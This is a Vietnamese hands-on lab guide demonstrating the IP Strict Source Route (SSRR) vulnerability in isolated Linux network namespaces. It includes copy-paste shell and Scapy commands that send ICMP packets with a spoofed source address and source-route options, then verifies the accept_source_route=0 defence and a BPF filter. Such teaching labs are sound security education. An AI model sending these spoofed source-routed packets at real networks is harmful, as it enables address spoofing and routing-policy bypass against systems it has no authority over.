# HƯỚNG DẪN THỰC HÀNH: LAB 02
## IP Source Routing Vulnerability (SSRR / LSRR)

---

### 1. MỤC TIÊU & MÔ HÌNH MẠNG
- **Mục tiêu:** Lợi dụng tùy chọn IP Strict Source and Record Route (SSRR - Type 137) để ép buộc máy chủ phản hồi gói tin qua các router chỉ định, đồng thời kiểm chứng cơ chế phòng thủ lọc gói tin IP Options bằng BPF (`ip[0] & 0x0f > 5`) và tham số `sysctl accept_source_route = 0`.
- **Topology:**
  - `h1`: `10.0.0.1/24` (Attacker) trên `veth1`
  - `h2`: `10.0.0.2/24` (Victim) trên `veth2`
  - Địa chỉ giả mạo (Spoofed IP): `10.0.0.77`

---

### 2. CÁCH 1: CHẠY NHANH TỪ CÁC SCRIPT CÓ SẴN

```bash
# Bước 1: Khởi tạo topology mạng và cấu hình kernel cho phép Source Routing
sudo bash docs/progress/LAB02/scripts/setup_pair.sh

# Bước 2: Bắt gói tin trên h2 để quan sát gói SSRR có IP Options (IHL > 5)
sudo ip netns exec h2 tcpdump -i veth2 -nn -v "ip[0] & 0x0f > 5" &
TCPDUMP_PID=$!
sleep 1

# Bước 3: Gửi gói tin ICMP SSRR mang IP nguồn giả mạo 10.0.0.77 từ h1
sudo ip netns exec h1 python3 docs/progress/LAB02/scripts/ssrr.py

# Bước 4: Tắt tcpdump
kill $TCPDUMP_PID 2>/dev/null || true
```

---

### 3. CÁCH 2: CHẠY ĐỘC LẬP BẰNG COPY-PASTE (STANDALONE)

Dán trực tiếp khối lệnh dưới đây vào Terminal Kali Linux:

```bash
# === 1. TẠO MÔI TRƯỜNG VÀ CẤU HÌNH KERNEL DỄ BỊ TẤN CÔNG ===
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
sudo ip netns add h1
sudo ip netns add h2
sudo ip link add veth1 type veth peer name veth2
sudo ip link set veth1 netns h1
sudo ip link set veth2 netns h2
sudo ip netns exec h1 ip link set dev lo up
sudo ip netns exec h1 ip addr add 10.0.0.1/24 dev veth1
sudo ip netns exec h1 ip link set dev veth1 up
sudo ip netns exec h2 ip link set dev lo up
sudo ip netns exec h2 ip addr add 10.0.0.2/24 dev veth2
sudo ip netns exec h2 ip link set dev veth2 up

# Tĩnh ARP cho IP giả mạo
VETH1_MAC=$(sudo ip netns exec h1 cat /sys/class/net/veth1/address)
sudo ip netns exec h2 ip neigh replace 10.0.0.77 lladdr "$VETH1_MAC" dev veth2

# Bật tính năng chấp nhận Source Route trên h2
for dev in all default lo veth2; do
    sudo ip netns exec h2 sysctl -w net.ipv4.conf.$dev.accept_source_route=1 >/dev/null
done
sudo ip netns exec h2 sysctl -w net.ipv4.ip_forward=1 >/dev/null

# === 2. GỬI GÓI TIN IP STRICT SOURCE ROUTING (SSRR) ===
echo "[*] Gửi gói tin ICMP SSRR từ 10.0.0.77 tới 10.0.0.2..."
sudo ip netns exec h1 python3 -c '
from scapy.all import IP, ICMP, IPOption_SSRR, send
pkt = IP(src="10.0.0.77", dst="10.0.0.2", options=[IPOption_SSRR(routers=["10.0.0.1", "10.0.0.2"])]) / ICMP()
send(pkt, iface="veth1", verbose=1)
'

# === 3. KIỂM CHỨNG PHÒNG THỦ: KHÓA ACCEPT_SOURCE_ROUTE ===
echo "[*] Kích hoạt phòng thủ: accept_source_route = 0..."
for dev in all default lo veth2; do
    sudo ip netns exec h2 sysctl -w net.ipv4.conf.$dev.accept_source_route=0 >/dev/null
done

# Gửi lại gói tin kiểm tra: Gói tin sẽ bị Kernel drop hoàn toàn
sudo ip netns exec h1 python3 -c '
from scapy.all import IP, ICMP, IPOption_SSRR, send
pkt = IP(src="10.0.0.77", dst="10.0.0.2", options=[IPOption_SSRR(routers=["10.0.0.1", "10.0.0.2"])]) / ICMP()
send(pkt, iface="veth1", verbose=0)
print("[+] Đã gửi gói SSRR sau khi phòng thủ. Nạn nhân không còn phản hồi.")
'
```

---

### 4. QUAN SÁT & TIÊU CHÍ THÀNH CÔNG
1. **BPF Filter `ip[0] & 0x0f > 5`:** Bắt được gói tin vì cờ IHL (Internet Header Length) tăng từ 5 (20 bytes chuẩn) lên 8 (32 bytes do có thêm 12 bytes IP Options).
2. **Khi bật phòng vệ (`accept_source_route = 0`):** Máy chủ nạn nhân drop gói tin ngay ở tầng IP, không gửi lại bất kỳ phản hồi nào về `10.0.0.1`.

---

### 5. LỆNH DỌN DẸP MÔI TRƯỜNG
```bash
sudo ip netns del h1 2>/dev/null || true
sudo ip netns del h2 2>/dev/null || true
```

